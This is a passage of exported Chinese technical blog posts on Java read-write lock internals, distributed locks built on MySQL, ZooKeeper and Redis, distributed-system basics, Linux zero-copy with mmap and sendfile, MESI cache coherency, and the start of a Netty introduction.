在取到写锁线程的数目后，首先判断是否已经有线程持有了锁。如果已经有线程持有了锁(c!=0)，则查看当前写锁线程的数目，如果写线程数为0（即此时存在读锁）或者持有锁的线程不是当前线程就返回失败（涉及到公平锁和非公平锁的实现）。 如果写入锁的数量大于最大数（65535，2的16次方-1）就抛出一个Error。 如果当且写线程数为0（那么读线程也应该为0，因为上面已经处理c!=0的情况），并且当前线程需要阻塞那么就返回失败；如果通过CAS增加写线程数失败也返回失败。 如果c=0,w=0或者c&gt;0,w&gt;0（重入），则设置当前线程或锁的拥有者，返回成功！ tryAcquire()除了重入条件（当前线程为获取了写锁的线程）之外，增加了一个读锁是否存在的判断。如果存在读锁，则写锁不能被获取，原因在于：必须确保写锁的操作对读锁可见，如果允许读锁在已被获取的情况下对写锁的获取，那么正在运行的其他读线程就无法感知到当前写线程的操作。 因此，只有等待其他读线程都释放了读锁，写锁才能被当前线程获取，而写锁一旦被获取，则其他读写线程的后续访问均被阻塞。写锁的释放与ReentrantLock的释放过程基本类似，每次释放均减少写状态，当写状态为0时表示写锁已被释放，然后等待的读写线程才能够继续访问读写锁，同时前次写线程的修改对后续的读写线程可见。 接着是读锁的代码： 123456789101112131415161718192021222324252627protected final int tryAcquireShared(int unused) &#123; Thread current = Thread.currentThread(); int c = getState(); if (exclusiveCount(c) != 0 &amp;&amp; getExclusiveOwnerThread() != current) return -1; // 如果其他线程已经获取了写锁，则当前线程获取读锁失败，进入等待状态 int r = sharedCount(c); if (!readerShouldBlock() &amp;&amp; r &lt; MAX_COUNT &amp;&amp; compareAndSetState(c, c + SHARED_UNIT)) &#123; if (r == 0) &#123; firstReader = current; firstReaderHoldCount = 1; &#125; else if (firstReader == current) &#123; firstReaderHoldCount++; &#125; else &#123; HoldCounter rh = cachedHoldCounter; if (rh == null || rh.tid != getThreadId(current)) cachedHoldCounter = rh = readHolds.get(); else if (rh.count == 0) readHolds.set(rh); rh.count++; &#125; return 1; &#125; return fullTryAcquireShared(current);&#125; 可以看到在tryAcquireShared(int unused)方法中，如果其他线程已经获取了写锁，则当前线程获取读锁失败，进入等待状态。如果当前线程获取了写锁或者写锁未被获取，则当前线程（线程安全，依靠CAS保证）增加读状态，成功获取读锁。读锁的每次释放（线程安全的，可能有多个读线程同时释放读锁）均减少读状态，减少的值是“1&lt;&lt;16”。所以读写锁才能实现读读的过程共享，而读写、写读、写写的过程互斥。 此时，我们再回头看一下互斥锁ReentrantLock中公平锁和非公平锁的加锁源码： 我们发现在ReentrantLock虽然有公平锁和非公平锁两种，但是它们添加的都是独享锁。根据源码所示，当某一个线程调用lock方法获取锁时，如果同步资源没有被其他线程锁住，那么当前线程在使用CAS更新state成功后就会成功抢占该资源。而如果公共资源被占用且不是被当前线程占用，那么就会加锁失败。所以可以确定ReentrantLock无论读操作还是写操作，添加的锁都是都是独享锁。 Reference 不可不说的Java“锁”事 - https://tech.meituan.com/2018/11/15/java-lock.html","comments":true,"categories":[{"name":"Lock","slug":"Lock","permalink":"http://swsmile.info/categories/Lock/"},{"name":"Java","slug":"Lock/Java","permalink":"http://swsmile.info/categories/Lock/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/tags/Java/"},{"name":"Lock","slug":"Lock","permalink":"http://swsmile.info/tags/Lock/"}]},{"title":"【Distributed System】分布式锁（Distributed Lock）","date":"2019-07-11T13:48:27.000Z","path":"2019/07/11/【Distributed-System】分布式锁/","text":"背景对于锁大家肯定不会陌生，在Java中synchronized关键字和ReentrantLock可重入锁在我们的代码中是经常见的，一般我们用其在多线程环境中控制对资源的并发访问，但是随着分布式的快速发展，本地的加锁往往不能满足我们的需要，在我们的分布式环境中上面加锁的方法就会失去作用。于是人们为了在分布式环境中也能实现本地锁的效果，也是纷纷各出其招，今天让我们来聊一聊一般分布式锁实现的套路。 什么是锁？在单进程的系统中，当存在多个线程可以同时改变某个变量（可变共享变量）时，就需要对变量或代码块做同步，使其在修改这种变量时能够线性执行消除并发修改变量。 而同步的本质是通过锁来实现的。为了实现多个线程在一个时刻同一个代码块只能有一个线程可执行，那么需要在某个地方做个标记，这个标记必须每个线程都能看到，当标记不存在时可以设置该标记，其余后续线程发现已经有标记了则等待拥有标记的线程结束同步代码块取消标记后再去尝试设置标记。这个标记可以理解为锁。 不同地方实现锁的方式也不一样，只要能满足所有线程都能看得到标记即可。如 Java 中 synchronize 是在对象头设置标记，Lock 接口的实现类基本上都只是某一个 volitile 修饰的 int 型变量其保证每个线程都能拥有对该 int 的可见性和原子修改，linux 内核中也是利用互斥量或信号量等内存数据做标记。 除了利用内存数据做锁其实任何互斥的都能做锁（只考虑互斥情况），如流水表中流水号与时间结合做幂等校验可以看作是一个不会释放的锁，或者使用某个文件是否存在作为锁等。只需要满足在对标记进行修改能保证原子性和内存可见性即可。 分布式场景在许多的场景中，我们为了保证数据的最终一致性，需要很多的技术方案来支持，比如分布式事务、分布式锁等。很多时候我们需要保证一个方法在同一时间内只能被同一个线程执行。在单机环境中，通过 Java 提供的并发 API 我们可以解决，但是在分布式环境下，就没有那么简单啦。 分布式与单机情况下最大的不同在于其不是多线程而是多进程。 多线程由于可以共享堆内存，因此可以简单的采取内存作为标记存储位置。而进程之间甚至可能都不在同一台物理机上，因此需要将标记存储在一个所有进程都能看到的地方。 分布式锁（Distributed Lock）当在分布式模型下，数据只有一份（或有限制），此时需要利用锁的技术控制某一时刻修改数据的进程数。 与单机模式下的锁不仅需要保证进程可见，还需要考虑进程与锁之间的网络问题（在分布式情况下，之所以问题变得复杂，主要就是需要考虑到网络的延时和不可靠）。 分布式锁还是可以将标记存在内存，只是该内存不是某个进程分配的内存而是公共内存如 Redis、Memcache。至于利用数据库、文件等做锁与单机的实现是一样的，只要保证标记能互斥就行。 分布式锁的一些特点当我们确定了在不同节点上需要分布式锁，那么我们需要了解分布式锁到底应该有哪些特点: 互斥性：和我们本地锁一样互斥性是最基本，但是分布式锁需要保证在不同节点的不同线程的互斥。 可重入性：同一个节点上的同一个线程如果获取了锁之后那么也可以再次获取这个锁。 锁超时：和本地锁一样支持锁超时，防止死锁。 高效，高可用：加锁和解锁需要高效，同时也需要保证高可用防止分布式锁失效，可以增加降级。 支持阻塞和非阻塞：和ReentrantLock一样支持lock和trylock以及tryLock(long timeOut)。 支持公平锁和非公平锁（可选）：公平锁的意思是按照请求加锁的顺序获得锁，非公平锁就相反是无序的。这个一般来说实现的比较少。 常见的分布式锁我们了解了一些特点之后，我们一般实现分布式锁有以下几个方式: MySQL ZooKeeper Redis 自研分布式锁，如谷歌的Chubby。 下面分开介绍一下这些分布式锁的实现原理。 MySQL分布式锁首先来说一下Mysql分布式锁的实现原理，相对来说这个比较容易理解，毕竟数据库和我们开发人员在平时的开发中息息相关。对于分布式锁我们可以创建一个锁表: 前面我们所说的lock(),trylock(long timeout)，trylock()这几个方法可以用下面的伪代码实现。 lock()lock一般是阻塞式的获取锁，意思就是不获取到锁誓不罢休，那么我们可以写一个死循环来执行其操作: mysqlLock.lock()方法内部会执行一个SQL，为了达到可重入锁的效果那么我们应该先进行查询，如果有值，那么需要比较node_info是否一致，这里的node_info可以用机器IP和线程名字来表示，如果一致那么就加可重入锁count的值，如果不一致那么就返回false。如果没有值那么直接插入一条数据。伪代码如下: 需要注意的是这一段代码需要加事务，必须要保证这一系列操作的原子性。 tryLock()和tryLock(long timeout)tryLock()是非阻塞获取锁，如果获取不到那么就会马上返回，代码可以如下: tryLock(long timeout)实现如下: mysqlLock.lock和上面一样，但是要注意的是select … for update这个是阻塞的获取行锁，如果同一个资源并发量较大还是有可能会退化成阻塞的获取锁。 unlock()unlock的话如果这里的count为1那么可以删除，如果大于1那么需要减去1。 锁超时我们有可能会遇到我们的机器节点挂了，那么这个锁就不会得到释放，我们可以启动一个定时任务，通过计算一般我们处理任务的一般的时间，比如是5ms，那么我们可以稍微扩大一点，当这个锁超过20ms没有被释放我们就可以认定是节点挂了然后将其直接释放。 总结 适用场景：MySQL分布式锁一般适用于资源不存在数据库，如果数据库存在比如订单，那么可以直接对这条数据加行锁，不需要我们上面多的繁琐的步骤，比如一个订单，那么我们可以用select * from order_table where id = &#39;xxx&#39; for update进行加行锁，那么其他的事务就不能对其进行修改。 优点：理解起来简单，不需要维护额外的第三方中间件，比如Redis，ZooKeeper。 缺点：虽然容易理解但是实现起来较为繁琐，需要自己考虑锁超时，加事务等等。性能局限于数据库，一般对比缓存来说性能较低。对于高并发的场景并不是很适合。 基于乐观锁实现MySQL分布式锁前面我们介绍的实现方法是基于悲观锁的思想，这里我们也介绍一下基于乐观锁思想的实现。 在我们实际项目中也是经常实现乐观锁，因为我们加行锁的性能消耗比较大，通常我们会对于一些竞争不是那么激烈，但是其又需要保证我们并发的顺序执行使用乐观锁进行处理，我们可以对我们的表加一个版本号字段，那么我们查询出来一个版本号之后，update或者delete的时候需要依赖我们查询出来的版本号，判断当前数据库和查询出来的版本号是否相等，如果相等那么就可以执行，如果不等那么就不能执行。这样的一个策略很像我们的CAS（Compare And Swap），比较并交换是一个原子操作。这样我们就能避免加 select * for update 行锁的开销。 ZooKeeperZooKeeper是一个分布式的，开放源码的分布式应用程序协调服务，是Google的Chubby一个开源的实现，是Hadoop和Hbase的重要组件。 那对于我们初次认识的人，可以理解成ZooKeeper就像是我们的电脑文件系统，我们可以在d盘中创建文件夹a，并且可以继续在文件夹a中创建文件夹a1，a2。 那我们的文件系统有什么特点？那就是同一个目录下文件名称不能重复，同样ZooKeeper也是这样的。 在ZooKeeper所有的节点，也就是文件夹称作Znode，而且这个Znode节点是可以存储数据的。 我们以某个资源为目录，然后这个目录下面的节点就是我们需要获取锁的客户端，未获取到锁的客户端注册需要注册Watcher到上一个客户端，可以用下图表示： /lock 是我们用于加锁的目录，/resource_name 是我们锁定的资源，其下面的节点按照我们加锁的顺序排列。 CuratorCurator封装了Zookeeper底层的API，使我们更加容易方便的对Zookeeper进行操作，并且它封装了分布式锁的功能，这样我们就不需要再自己实现了。 Curator实现了可重入锁（InterProcessMutex），也实现了不可重入锁（InterProcessSemaphoreMutex）。在可重入锁中还实现了读写锁。 InterProcessMutexInterProcessMutex是Curator实现的可重入锁，我们可以通过下面的一段代码实现我们的可重入锁: 我们利用acuire进行加锁，release进行解锁。 加锁的流程具体如下： 首先进行可重入的判定：这里的可重入锁记录在 ConcurrentMap&lt;Thread, LockData&gt; threadData 这个Map里面，如果threadData.get(currentThread) 是有值的那么就证明是可重入锁，然后记录就会加1。我们之前的MySQL其实也可以通过这种方法去优化，可以不需要count字段的值，将这个维护在本地可以提高性能。 然后在我们的资源目录下创建一个节点:比如这里创建一个/0000000002这个节点，这个节点需要设置为EPHEMERAL_SEQUENTIAL也就是临时节点并且有序。 获取当前目录下所有子节点，判断自己的节点是否位于子节点第一个。 如果是第一个，则获取到锁，那么可以返回。 如果不是第一个，则证明前面已经有人获取到锁了，那么需要获取自己节点的前一个节点。/0000000002的前一个节点是/0000000001，我们获取到这个节点之后，再上面注册Watcher(这里的watcher其实调用的是object.notifyAll(),用来解除阻塞)。 object.wait(timeout)或object.wait():进行阻塞等待这里和我们第5步的watcher相对应。 解锁的具体流程： 首先进行可重入锁的判定:如果有可重入锁只需要次数减1即可，减1之后加锁次数为0的话继续下面步骤，不为0直接返回。 删除当前节点。 删除threadDataMap里面的可重入锁的数据。 读写锁Curator提供了读写锁，其实现类是InterProcessReadWriteLock，这里的每个节点都会加上前缀： 123private static final String READ_LOCK_NAME = &quot;__READ__&quot;;private static final String WRITE_LOCK_NAME = &quot;__WRIT__&quot;;复制代码 根据不同的前缀区分是读锁还是写锁，对于读锁，如果发现前面有写锁，那么需要将watcher注册到和自己最近的写锁。写锁的逻辑和我们之前分析的依然保持不变。 锁超时Zookeeper不需要配置锁超时，由于我们设置节点是临时节点，我们的每个机器维护着一个ZK的session，通过这个session，ZK可以判断机器是否宕机。如果我们的机器挂掉的话，那么这个临时节点对应的就会被删除，所以我们不需要关心锁超时。 ZooKeeper小结 优点：ZooKeeper可以不需要关心锁超时时间，实现起来有现成的第三方包，比较方便，并且支持读写锁，ZooKeeper获取锁会按照加锁的顺序，所以其是公平锁。对于高可用利用ZK集群进行保证。 缺点：ZooKeeper需要额外维护，增加维护成本，性能和MySQL相差不大，依然比较差。并且需要开发人员了解ZooKeeper是什么。 Redis大家在网上搜索分布式锁，恐怕最多的实现就是Redis了，Redis因为其性能好，实现起来简单所以让很多人都对其十分青睐。 Redis分布式锁简单实现熟悉Redis的同学那么肯定对setNx(set if not exist)方法不陌生，如果不存在则更新，其可以很好的用来实现我们的分布式锁。对于某个资源加锁我们只需要 1setNx resourceName value 这里有个问题，加锁了之后如果机器宕机那么这个锁就不会得到释放所以会加入过期时间，加入过期时间需要和setNx同一个原子操作，在Redis2.8之前我们需要使用Lua脚本达到我们的目的，但是redis2.8之后redis支持nx和ex操作是同一原子操作。 1set resourceName value ex 5 nx Redis小结 优点：对于Redis实现简单，性能对比ZooKeeper和MySQL较好。如果不需要特别复杂的要求，那么自己就可以利用setNx进行实现，如果自己需要复杂的需求的话那么可以利用或者借鉴Redission。对于一些要求比较严格的场景来说的话可以使用RedLock。 缺点：需要维护Redis集群，如果要实现RedLock那么需要维护更多的集群。 Reference 再有人问你分布式锁，这篇文章扔给他 - https://juejin.im/post/5bbb0d8df265da0abd3533a5 分布式锁看这篇就够了 - https://zhuanlan.zhihu.com/p/42056183 通俗讲解分布式锁，看完不懂算作者输 - https://zhuanlan.zhihu.com/p/72896771","comments":true,"categories":[{"name":"DistributedSystem","slug":"DistributedSystem","permalink":"http://swsmile.info/categories/DistributedSystem/"}],"tags":[{"name":"Distributed System","slug":"Distributed-System","permalink":"http://swsmile.info/tags/Distributed-System/"}]},{"title":"【Distributed System】分布式系统","date":"2019-07-11T03:34:29.000Z","path":"2019/07/11/【Distributed-System】分布式系统/","text":"背景集中式系统（Central Systems）在学习分布式之前，先了解一下与之相对应的集中式系统（Central Systems）是什么样的。 集中式系统（Central Systems）用一句话概括就是：一个主机带多个终端。终端没有数据处理能力，仅负责数据的录入和输出。而运算、存储等全部在主机上进行。现在的银行系统，大部分都是这种集中式的系统，此外，在大型企业、科研单位、军队、政府等也有分布。集中式系统，主要流行于上个世纪。 集中式系统的最大的特点就是部署结构非常简单，底层一般采用从IBM、HP等厂商购买到的昂贵的大型主机。因此无需考虑如何对服务进行多节点的部署，也就不用考虑各节点之间的分布式协作问题。但是，由于采用单机部署。很可能带来系统大而复杂、难于维护、发生单点故障（单个点发生故障的时候会波及到整个系统或者网络，从而导致整个系统或者网络的瘫痪）、扩展性差等问题。 分布式系统（Distributed Systems）根据《Distributed systems- principles and paradigms》，分布式系统是由若干独立的计算机组成的集合，这些计算机对于用户来说只是一个单独的计算机。 含义： 一个分布式系统由多个独立的计算机组成，这些独立的计算机之间需要相互协作，以组成这个具有完整功能的分布式系统 在这些独立的计算机中，他们可能是一个具备高性能的大型计算机（mainframe computer），也可以只是传感器网络（sensor networks）中的一个小节点 对于用户而言，他们只会感受到他们只在和一个单一独立的系统进行交互 为了将不同规格或形态（heterogeneous）的计算机连接在一起，并构成一个单一的系统，我们需要增加一层软件中间件（software middleware），这层中间件位于更高层的用户应用层之下，又位于这些计算机的操作系统（这些操作系统提供了中间件进行的网络通讯的基础）之上。如下图所示： 在上图的例子中，Application B同时运行于Computer 2和Computer 3， 分布式系统的类型分布式计算系统分布式信息系统普适系统（Pervasive Systems）传感器网络（Sensor Networks）典型的一个传感器网络又几千或者几万的小节点组成，每一个小节点都是一个传感器。绝大部分传感器网络使用无线通信且每个节点经常是电池供电，即无线传感器网络（Wireless Sensor Networks），这意味着节点拥有极其有限的计算能力和通讯能力。 传感器网络很像一个分布式的数据库。因为很多传感器网络被用于通过向传感器网络中的节点发送查询以提取特定信息，最终计算一个特定数据。比如，当前高速公路X上向北方向的车流量为多少，这时，传感器网络中部分节点会得到请求查询（类似于传统数据库那样），此后，这些节点返回的数据会被聚合到一个处理中心并计算出一个结果。 常用的分布式方案分布式应用和服务 将应用和服务进行分层和分割，然后将应用和服务模块进行分布式部署。这样做不仅可以提高并发访问能力、减少数据库连接和资源消耗，还能使不同应用复用共同的服务，使业务易于扩展。 分布式的服务（比如Web服务、数据库、缓存等） 分布式静态资源 对网站的静态资源如JS、CSS、图片等资源进行分布式部署可以减轻应用服务器的负载压力，提高访问速度。 分布式数据和存储 大型网站常常需要处理海量数据，单台计算机往往无法提供足够的内存空间，可以对这些数据进行分布式存储。 分布式计算 随着计算技术的发展，有些应用需要非常巨大的计算能力才能完成，如果采用集中式计算，需要耗费相当长的时间来完成。分布式计算将该应用分解成许多小的部分，分配给多台计算机进行处理。这样可以节约整体计算时间，大大提高计算效率。 分布式的计算能力（Hadoop、Spark、MapReduce等） 分布式系统的优缺点单体架构优点 易于开发：开发的方式简单，方便运行也容易调试 易于测试 易于部署 简单 缺点 项目过于臃肿，维护成本大，出现bug难定位。 资源无法隔离：共享一个数据库，或者一块内存。 如果一个功能模块突然访问量过大，可能影响整个系统的性能。 无法灵活扩展：单体系统也可以集群部署，但是不够灵活，我明明只是订单系统遇到了瓶颈， 交付周期长：所有功能得一起上线，一起构建，一起部署。 任何一个环节出错，都可能影响交付。 那分布式的优点自然就和单体架构就对立了~ 分布式架构再谈谈分布式架构的缺点： 性能，分布式系统是跨进程，跨网络的，性能会受网络延迟和带宽的影响。 可靠性：由于高度依赖网络状况，任何一次远程调用都可以失败。随着服务的增多，还会出现更多的潜在故障点。 异步：引入各种中间件，异步通信大大增加了功能实现的复杂度。 数据一致性：分布式系统必然会有分布式事务的出现，这时对数据的一致性，需要在C（一致性）A（可用性）P（分区容错性）中做出选择。 运维成本：一个系统拆成了多个服务，每个服务都得配置，部署，监控，日志处理。得到的同时也意味着失去，权衡与取舍 始终是架构的魅力 稳定性不足，把所有Web服务器、数据库都运行在一台PC上。当这个PC崩时，整个系统就崩溃了，同时也没有任何备份，简直灭顶之灾。 可扩展性不足，任何的主机（哪怕是小型机、超级计算机）都会有性能的极限。而分布式系统可以通过不断扩张主机的数量以实现横向水平性能的扩展。 Reference 《Distributed systems- principles and paradigms (2nd edition)》 用大白话聊聊分布式系统 - https://waylau.com/talk-about-distributed-system/ 初识分布式系统 - https://www.hollischuang.com/archives/655","comments":true,"categories":[{"name":"DistributedSystem","slug":"DistributedSystem","permalink":"http://swsmile.info/categories/DistributedSystem/"}],"tags":[{"name":"Distributed System","slug":"Distributed-System","permalink":"http://swsmile.info/tags/Distributed-System/"}]},{"title":"【Operating System】I/O - 零拷贝（Zero-copy）","date":"2019-07-11T03:12:37.000Z","path":"2019/07/11/【Operating-System】IO-零拷贝/","text":"背景在写一个服务端程序时（Web Server或者文件服务器），文件下载是一个基本功能。这时候服务端的任务是：将服务端主机磁盘中的文件不做修改地从已连接的socket发出去，我们通常用下面的代码完成： 12while((n = read(diskfd, buf, BUF_SIZE)) &gt; 0) write(sockfd, buf , n); 基本操作就是循环的从磁盘读入文件内容到缓冲区，再将缓冲区的内容发送到socket。但是由于Linux的I/O操作默认是缓冲I/O。这里面主要使用的也就是read和write两个系统调用，我们并不知道操作系统在其中做了什么。实际上在以上I/O操作中，发生了多次的数据拷贝。 当应用程序访问某块数据时，操作系统首先会检查，是不是最近访问过此文件，文件内容是否缓存在内核缓冲区，如果是，操作系统则直接根据read系统调用提供的buf地址，将内核缓冲区的内容拷贝到buf所指定的用户空间缓冲区中去。如果不是，操作系统则首先将磁盘上的数据拷贝的内核缓冲区，这一步目前主要依靠DMA来传输，然后再把内核缓冲区上的内容拷贝到用户缓冲区中。 接下来，write系统调用再把用户缓冲区的内容拷贝到网络堆栈相关的内核缓冲区中，最后socket再把内核缓冲区的内容发送到网卡上。 说了这么多，不如看图清楚： 从上图中可以看出，共产生了四次数据拷贝，即使使用了 DMA 来处理了与硬件的通讯，CPU仍然需要处理两次数据拷贝，与此同时，在用户态与内核态也发生了多次上下文切换，无疑也加重了CPU负担。 在此过程中，我们没有对文件内容做任何修改，那么在内核空间和用户空间来回拷贝数据无疑就是一种浪费，而零拷贝主要就是为了解决这种低效性。 零拷贝（Zero-copy）零拷贝主要的任务就是避免CPU将数据从一块存储拷贝到另外一块存储，主要就是利用各种零拷贝技术，避免让CPU做大量的数据拷贝任务，减少不必要的拷贝，或者让别的组件来做这一类简单的数据传输任务，让CPU解脱出来专注于别的任务。这样就可以让系统资源的利用更加有效。 我们继续回到引文中的例子，我们如何减少数据拷贝的次数呢？一个很明显的着力点就是减少数据在内核空间和用户空间来回拷贝，这也引入了零拷贝的一个类型： 让数据传输不需要经过user space - 使用mmap我们减少拷贝次数的一种方法是调用mmap()来代替read调用： 12buf = mmap(diskfd, len);write(sockfd, buf, len); 应用程序调用mmap()，磁盘上的数据会通过DMA被拷贝的内核缓冲区，接着操作系统会把这段内核缓冲区与应用程序共享，这样就不需要把内核缓冲区的内容往用户空间拷贝。应用程序再调用write()，操作系统直接将内核缓冲区的内容拷贝到socket缓冲区中，这一切都发生在内核态，最后，socket缓冲区再把数据发到网卡去。 同样的，看图很简单： 使用mmap替代read很明显减少了一次拷贝，当拷贝数据量很大时，无疑提升了效率。但是使用mmap是有代价的。当你使用mmap时，你可能会遇到一些隐藏的陷阱。例如，当你的程序map了一个文件，但是当这个文件被另一个进程截断(truncate)时, write系统调用会因为访问非法地址而被SIGBUS信号终止。SIGBUS信号默认会杀死你的进程并产生一个coredump，如果你的服务器这样被中止了，那会产生一笔损失。 通常我们使用以下解决方案避免这种问题： 为SIGBUS信号建立信号处理程序当遇到SIGBUS信号时，信号处理程序简单地返回，write系统调用在被中断之前会返回已经写入的字节数，并且errno会被设置成success,但是这是一种糟糕的处理办法，因为你并没有解决问题的实质核心。 使用文件租借锁通常我们使用这种方法，在文件描述符上使用租借锁，我们为文件向内核申请一个租借锁，当其它进程想要截断这个文件时，内核会向我们发送一个实时的RT_SIGNAL_LEASE信号，告诉我们内核正在破坏你加持在文件上的读写锁。这样在程序访问非法内存并且被SIGBUS杀死之前，你的write系统调用会被中断。write会返回已经写入的字节数，并且置errno为success。 我们应该在mmap文件之前加锁，并且在操作完文件后解锁： 12345678910if(fcntl(diskfd, F_SETSIG, RT_SIGNAL_LEASE) == -1) &#123; perror(\"kernel lease set signal\"); return -1;&#125;/* l_type can be F_RDLCK F_WRLCK 加锁*//* l_type can be F_UNLCK 解锁*/if(fcntl(diskfd, F_SETLEASE, l_type))&#123; perror(\"kernel lease set type\"); return -1;&#125; 使用sendfile从2.1版内核开始，Linux引入了sendfile来简化操作: 12#include&lt;sys/sendfile.h&gt;ssize_t sendfile(int out_fd, int in_fd, off_t *offset, size_t count); 系统调用sendfile()在代表输入文件的描述符in_fd和代表输出文件的描述符out_fd之间传送文件内容（字节）。描述符out_fd必须指向一个套接字，而in_fd指向的文件必须是可以mmap的。这些局限限制了sendfile的使用，使sendfile只能将数据从文件传递到套接字上，反之则不行。 使用sendfile不仅减少了数据拷贝的次数，还减少了上下文切换，数据传送始终只发生在kernel space。 在我们调用sendfile时，如果有其它进程截断了文件会发生什么呢？假设我们没有设置任何信号处理程序，sendfile调用仅仅返回它在被中断之前已经传输的字节数，errno会被置为success。如果我们在调用sendfile之前给文件加了锁，sendfile的行为仍然和之前相同，我们还会收到RT_SIGNAL_LEASE的信号。 目前为止，我们已经减少了数据拷贝的次数了，但是仍然存在一次拷贝，就是页缓存到socket缓存的拷贝。那么能不能把这个拷贝也省略呢？ 借助于硬件上的帮助，我们是可以办到的。之前我们是把页缓存的数据拷贝到socket缓存中，实际上，我们仅仅需要把缓冲区描述符传到socket缓冲区，再把数据长度传过去，这样DMA控制器直接将页缓存中的数据打包发送到网络中就可以了。 总结一下，sendfile系统调用利用DMA引擎将文件内容拷贝到内核缓冲区去，然后将带有文件位置和长度信息的缓冲区描述符添加socket缓冲区去，这一步不会将内核中的数据拷贝到socket缓冲区中，DMA引擎会将内核缓冲区的数据拷贝到协议引擎中去，避免了最后一次拷贝。 不过这一种收集拷贝功能是需要硬件以及驱动程序支持的。 Reference Linux 中的零拷贝技术，第 1 部分 - https://www.ibm.com/developerworks/cn/linux/l-cn-zerocopy1/ Linux 中的零拷贝技术，第 2 部分 - https://www.ibm.com/developerworks/cn/linux/l-cn-zerocopy2/ 浅析Linux中的零拷贝技术 - https://www.jianshu.com/p/fad3339e3448 理解Netty中的零拷贝（Zero-Copy）机制 - https://my.oschina.net/plucury/blog/192577","comments":true,"categories":[{"name":"OperatingSystem","slug":"OperatingSystem","permalink":"http://swsmile.info/categories/OperatingSystem/"}],"tags":[{"name":"Operating System","slug":"Operating-System","permalink":"http://swsmile.info/tags/Operating-System/"}]},{"title":"【Java】JVM - Java内存模型中的缓存一致性（Cache Coherency）问题","date":"2019-07-11T03:06:21.000Z","path":"2019/07/11/【Java】JVM-内存模型中的缓存一致性问题/","text":"缓存一致性（Cache Coherency）问题不知道小伙伴们有没有想过这样的问题：内存模型到底是怎么保证缓存一致性的呢？ 接下来我们试着回答这个问题。首先，缓存一致性是由于引入缓存而导致的问题，所以，这是很多CPU厂商必须解决的问题。为了解决前面提到的缓存数据不一致的问题，人们提出过很多方案，通常来说有以下2种方案： 通过在总线加LOCK#锁的方式。 通过缓存一致性协议（Cache Coherence Protocol）。 总线加锁在早期的CPU中，是通过在总线上加LOCK#锁的形式来解决缓存不一致的问题。因为CPU和其他部件进行通信都是通过总线来进行的，如果对总线加LOCK#锁的话，也就是说阻塞了其他CPU对其他部件访问（如内存），从而使得只能有一个CPU能使用这个变量的内存。在总线上发出了LCOK#锁的信号，那么只有等待这段代码完全执行完毕之后，其他CPU才能从其内存读取变量，然后进行相应的操作。这样就解决了缓存不一致的问题。 但是由于在锁住总线期间，其他CPU无法访问内存，会导致效率低下。因此出现了第二种解决方案，通过缓存一致性协议来解决缓存一致性问题。 缓存一致性协议（Cache Coherence Protocol）缓存一致性协议（Cache Coherence Protocol），最出名的就是Intel 的MESI协议，MESI协议保证了每个缓存中使用的共享变量的副本是一致的。 MESI的核心的思想是：当CPU写数据时，如果发现操作的变量是共享变量（即在其他CPU中也存在该变量的副本），则会发出信号通知其他CPU，以让它们将该变量的缓存行置为无效状态，因此当其他CPU需要读取这个变量时，发现自己缓存中缓存该变量的缓存行是无效的，那么它就会从内存重新读取。 在MESI协议中，每个缓存可能有有4个状态，它们分别是： M（Modified）：这行数据有效，数据被修改了，和内存中的数据不一致，数据只存在于本Cache中。 E（Exclusive）：这行数据有效，数据和内存中的数据一致，数据只存在于本Cache中。 S（Shared）：这行数据有效，数据和内存中的数据一致，数据存在于很多Cache中。 I（Invalid）：这行数据无效。 关于MESI的更多细节这里就不详细介绍了，读者只要知道，MESI是一种比较常用的缓存一致性协议，他可以用来解决缓存之间的数据一致性问题就可以了。 但是，值得注意的是，传统的MESI协议中有两个行为的执行成本比较大。 一个是将某个Cache Line标记为Invalid状态； 另一个是当某Cache Line当前状态为Invalid时，写入新的数据。 所以CPU通过Store Buffer和Invalidate Queue组件来降低这类操作的延时，如图： 当一个CPU进行写入时，首先会给其它CPU发送Invalid消息，然后把当前写入的数据写入到Store Buffer中。然后异步在某个时刻真正的写入到Cache中。 当前CPU核如果要读Cache中的数据，需要先扫描Store Buffer之后再读取Cache。 但是此时其它CPU核是看不到当前核的Store Buffer中的数据的，要等到Store Buffer中的数据被刷到了Cache之后才会触发失效操作。 而当一个CPU核收到Invalid消息时，会把消息写入自身的Invalidate Queue中，随后异步将其设为Invalid状态。 和Store Buffer不同的是，当前CPU核心使用Cache时并不扫描Invalidate Queue部分，所以可能会有极短时间的脏读问题。 所以，为了解决缓存的一致性问题，比较典型的方案是MESI缓存一致性协议。 MESI协议，可以保证缓存的一致性，但是无法保证实时性。 Reference 内存模型是怎么解决缓存一致性问题的？ - https://www.hollischuang.com/archives/2662 缓存一致性（Cache Coherency）入门 - https://www.infoq.cn/article/cache-coherency-primer","comments":true,"categories":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/tags/Java/"}]},{"title":"【Java】Netty入门","date":"2019-07-10T07:42:02.000Z","path":"2019/07/10/【Java】IO-Netty入门/","text":"背景如果你想知道Nginx是怎么写出来的，如果你想知道Tomcat和Jetty是如何实现的，如果你也想实现一个简单的Redis服务器，那都应该好好理解一下Netty，它们高性能的原理都是类似的。 我们回顾一下传统的HTTP服务器的原理 创建一个ServerSocket，监听并绑定一个端口 一系列客户端来请求这个端口 服务器使用Accept，获得一个来自客户端的Socket连接对象 启动一个新线程处理连接 读Socket，得到字节流 解码协议，得到Http请求对象 处理Http请求，得到一个结果，封装成一个HttpResponse对象 编码协议，将结果序列化字节流 写Socket，将字节流发给客户端 继续循环步骤3 HTTP服务器之所以称为HTTP服务器，是因为编码解码协议是HTTP协议，如果协议是Redis协议，那它就成了Redis服务器，如果协议是WebSocket，那它就成了WebSocket服务器，等等。 使用Netty你就可以定制编解码协议，实现自己的特定协议的服务器。 上面我们说的是一个传统的多线程服务器，这个也是Apache处理请求的模式。在高并发环境下，线程数量可能会创建太多，操作系统的任务调度压力大，系统负载也会比较高。那怎么办呢？ 于是NIO诞生了，NIO并不是Java独有的概念，NIO代表的一个词汇叫做I/O多路复用。它是由操作系统提供的系统调用，早期这个操作系统调用的名字是select，但是性能低下，后来渐渐演化成了Linux下的epoll和Mac里的kqueue。 我们一般就说是epoll，因为没有人拿苹果电脑作为服务器使用对外提供服务。而Netty就是基于Java NIO技术封装的一套框架。为什么要封装，因为原生的Java NIO使用起来没那么方便，而且还有臭名昭著的bug，Netty把它封装之后，提供了一个易于操作的使用模式和接口，用户使用起来也就便捷多了。 Netty是什么Netty是一款基于NIO（Nonblocking 